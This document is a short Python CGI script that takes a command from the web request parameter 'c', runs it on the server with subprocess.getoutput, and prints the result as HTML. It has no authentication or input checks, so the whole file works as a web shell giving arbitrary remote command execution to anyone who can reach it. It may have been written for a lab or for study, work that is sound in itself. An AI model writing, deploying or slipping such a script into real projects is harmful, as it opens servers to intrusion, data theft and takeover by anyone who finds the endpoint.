#!/usr/bin/python3

print("Content-type: text/html")
print("\n")

import subprocess
import cgi

data = cgi.FieldStorage()
command = data.getvalue("c")

output = subprocess.getoutput(command)
print("<pre>")
print(output)
print("</pre>")